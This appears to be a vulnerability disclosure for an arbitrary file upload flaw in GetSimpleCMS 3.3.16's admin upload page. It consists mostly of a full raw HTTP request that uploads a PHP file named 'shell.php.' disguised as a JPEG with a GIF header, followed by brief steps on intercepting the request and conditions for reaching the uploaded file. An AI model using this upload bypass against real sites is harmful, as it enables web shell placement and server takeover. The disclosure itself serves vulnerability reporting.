#### BUG_AUTHOR:acmglz
# GetSimpleCMS has any file upload
## Download address:
https://github.com/GetSimpleCMS/GetSimpleCMS/releases/tag/v3.3.16
## Version:V3.3.16
## Tested on: PHP, Apache, MySQL
## Affected Page:
/admin/upload.php

Attackers can control the permissions of websites by uploading files

## Proof of vulnerability:
## Payload：

request

```
POST /admin/upload.php?path= HTTP/1.1
Host: cmsxxxx.com
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Referer: http://cmsxxxx.com/admin/upload.php?path=
Content-Type: multipart/form-data; boundary=---------------------------306376624418395856912301056693
Cookie: GS_ADMIN_USERNAME=admin; 7c6db860ae06e77e5966ec2e1a68fd569dfd0ec3=1c2bded131bc03c6479b9dfbf87d9cb3109d69b8; 1a8a1561415a3403d5d9ce1b88113e15eefa929f=fb7dae482af37afd608b723a500bcb0e9d4879d8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Sec-GPC: 1
Origin: http://cmsxxxx.com
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Content-Length: 508

-----------------------------306376624418395856912301056693
Content-Disposition: form-data; name="file[]"; filename="shell.php."
Content-Type: image/jpeg

gif89a
<?php phpinfo();?>
-----------------------------306376624418395856912301056693
Content-Disposition: form-data; name="hash"

6147eb7408034d9137a0d56a14bed92d9609fb46
-----------------------------306376624418395856912301056693
Content-Disposition: form-data; name="submit"

Upload
-----------------------------306376624418395856912301056693--

```

## Trigger popup：
When the file is uploaded, the data packet is captured. Change it to the following

t1

When you return to the folder, you can see that the upload was successful

t2

After the test, the directory is inaccessible by default. If the directory and its upper directory do not have.htaccess files, the directory can be successfully accessed

t3
